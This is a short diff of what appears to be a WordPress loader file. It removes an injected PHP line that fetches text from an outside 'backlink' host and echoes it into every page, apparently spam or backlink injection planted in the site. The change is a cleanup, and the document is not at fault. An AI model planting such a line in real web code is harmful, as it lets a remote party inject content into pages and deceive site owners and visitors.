@@ -1,4 +1,3 @@
-<?php $a = file_get_contents('https://grtoto.store/backlink/keep-secret-rule-the-google.txt'); echo $a; ?>
 <?php
 /**
  * These functions are needed to load WordPress.
